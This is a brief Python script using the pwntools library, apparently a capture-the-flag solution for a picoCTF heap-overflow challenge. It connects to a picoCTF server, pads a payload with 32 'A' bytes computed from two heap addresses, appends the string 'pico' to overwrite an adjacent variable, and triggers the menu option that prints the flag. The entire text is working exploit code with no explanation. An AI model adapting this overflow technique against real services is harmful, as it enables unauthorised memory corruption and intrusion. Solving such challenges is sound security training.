from pwn import *

p = remote("tethys.picoctf.net",52764)

buffer =  0x6373d38ab2d0 - 0x6373d38ab2b0
payload = b"A" * buffer
payload += b"pico"

p.sendlineafter("Enter your choice: ",b"2")
p.sendlineafter("Data for buffer: ",payload)
p.sendlineafter("Enter your choice: ",b"4")
print(p.recvall())